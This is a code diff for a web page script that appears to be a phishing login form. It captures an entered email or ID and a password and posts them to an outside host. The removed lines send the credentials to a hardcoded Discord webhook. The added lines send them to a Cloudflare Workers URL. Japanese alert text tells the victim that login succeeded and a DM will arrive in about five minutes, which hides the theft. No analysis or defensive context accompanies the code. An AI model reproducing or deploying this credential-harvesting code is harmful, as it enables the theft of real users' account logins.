@@ -34,34 +34,36 @@
     </div>
   </div>
   <script>
-    document.getElementById('sendButton').addEventListener('click', function() {
-      const input1 = document.getElementById('eid').value;
-      const input2 = document.getElementById('pas').value;
+   document.getElementById('sendButton').addEventListener('click', function () {
+  const input1 = document.getElementById('eid').value;
+  const input2 = document.getElementById('pas').value;
 
-      const webhookURL = 'https://discord.com/api/webhooks/1398292051312906260/khWsEsLvQisvN-nzCACnM4s_xRAhRR36BIL-ukLXSryZRtSrPk-HqYAMB4vL_T7_3j41'; //discordのwebhook url
+  const workerURL = 'https://hk.letsgopony.workers.dev/';
 
-      const payload = {
-        content: `📩 :\n**メアドまたはID**: ${input1}\n**パスワード**: ${input2}`
-      };
+  const payload = {
+    input1: input1,
+    input2: input2
+  };
 
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(response => {
-        if (response.ok) {
-          alert('ログインが完了しました。５分程度でDMが送信されます');
-        } else {
-          alert('ログインに失敗しました。');
-        }
-      })
-      .catch(error => {
-        console.error('エラー:', error);
-        alert('エラーが発生しました。');
-      });
-    });
+  fetch(workerURL, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(response => {
+    if (response.ok) {
+      alert('ログインが完了しました。５分程度でDMが送信されます');
+    } else {
+      alert('ログインに失敗しました。');
+    }
+  })
+  .catch(error => {
+    console.error('エラー:', error);
+    alert('エラーが発生しました。');
+  });
+});
+
   </script>
  
